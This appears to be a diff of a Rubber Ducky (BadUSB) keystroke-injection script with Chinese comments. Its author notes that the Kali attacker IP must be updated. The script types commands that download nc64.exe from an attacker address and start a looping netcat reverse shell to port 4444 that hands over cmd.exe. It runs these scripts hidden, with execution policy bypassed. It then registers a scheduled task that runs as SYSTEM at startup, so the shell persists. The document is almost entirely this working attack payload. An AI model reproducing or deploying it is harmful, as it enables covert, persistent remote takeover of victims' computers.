@@ -31,36 +31,68 @@ REM so yeah the previous is above
 
 REM STRING echo (wget 'http://192.168.31.180/nc64.exe' -OutFile a.exe) > b.ps1
 REM the grammer have some problem
-STRING echo "while (`$true) {./a.exe 192.168.31.180 4444 -e cmd.exe -d}" > c.ps1
+
+
+REM 一定要注意改成kali现有的ip！（我多次忘了）
+
+STRING echo (wget 'http://10.122.206.176/nc64.exe' -OutFile a.exe) > b.ps1
 ENTER
-DELAY 1000
+
+REM 一定要注意改成kali现有的ip！（我多次忘了）
+
 STRING powershell -ExecutionPolicy ByPass -File b.ps1
 ENTER
 DELAY 1000
 
-STRING echo while($true){./a.exe 192.168.31.180 4444 -e cmd.exe -d} > c.ps1
+STRING echo while($true){./a.exe 10.122.206.176 4444 -e cmd.exe -d} > c.ps1
 ENTER
 DELAY 1000
 
-
 REM 以上，所有准备文件好了
-REM 接下来后台运行
 
 
-REM 开始（最后还是靠我自己改）
+REM 接下来是设置开机自启（注意：这一份代码功能在重启应该是还没开始的）
+
+
+REM 打开运行窗口
 GUI r
-DELAY 500
+DELAY 200
+
+REM 打开 PowerShell
 STRING powershell
 ENTER
-DELAY 2000
-REM 定义脚本路径和参数
-STRING $scriptPath = "C:\Users\halfa\c.ps1"
-ENTER
 DELAY 500
+
+REM 输入命令创建wrapper.ps1并写入内容
+STRING $wrapperScriptPath = "C:\Users\halfa\wrapper.ps1"
+ENTER
+STRING $scriptContent = @"
+ENTER
+STRING $scriptPath = 'C:\Users\halfa\c.ps1'
+ENTER
 STRING $arguments = "-ExecutionPolicy Bypass -File `"$scriptPath`""
 ENTER
-DELAY 500
-STRING Start-Process "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"C:\Users\halfa\c.ps1`"" -WindowStyle Hidden
+STRING Start-Process "powershell.exe" -ArgumentList $arguments -WindowStyle Hidden
 ENTER
+STRING "@ | Out-File -FilePath $wrapperScriptPath -Encoding UTF8
+ENTER
+DELAY 500
+
+REM 输入命令创建计划任务
+STRING $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File `"$wrapperScriptPath`""
+ENTER
+STRING $trigger = New-ScheduledTaskTrigger -AtStartup
+ENTER
+STRING $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+ENTER
+STRING Register-ScheduledTask -TaskName "RunScriptAtStartupWithWrapper" -Action $action -Trigger $trigger -Principal $principal
+ENTER
+DELAY 500
+
+REM 退出 PowerShell
+STRING exit
+ENTER
+
+
 
 
